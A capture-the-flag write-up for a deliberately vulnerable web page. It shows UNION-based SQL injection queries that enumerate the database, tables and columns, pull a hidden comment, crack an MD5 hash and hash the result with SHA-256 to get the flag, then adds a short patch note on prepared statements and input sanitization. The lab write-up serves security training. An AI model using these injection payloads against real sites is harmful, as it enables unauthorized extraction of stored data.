# Exploit
We visit the url "/index.php?page=searchimg".
This is the same sql injection as the one in "search_member_sql_inj_error_based" except we don't have sql which show us errors. So we reuse the same queries with a different result for the database name, table name, and column_name. This give us:

```
1 union all select 1,database() --> Member_images
1 union all select 1,group_concat(table_name) from Information_schema.tables where table_schema=database() --> list_images
1 union all select 1,group_concat(column_name) from Information_schema.columns where table_name=0x6c6973745f696d61676573 --> id,url,title,comment
1 union all select 1,group_concat(comment,0x0a) from list_images --> If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Well, let's decrypt it ([md5decrypt.net](https://md5decrypt.net)), this give us "albatroz".
Let's make a shasum 256 of it now:

```bash
echo -n albatroz | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188  -
```

Here's the flag  **f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**

# Patch
Just prepare the request and sanitize user input (with a filter for characters for example).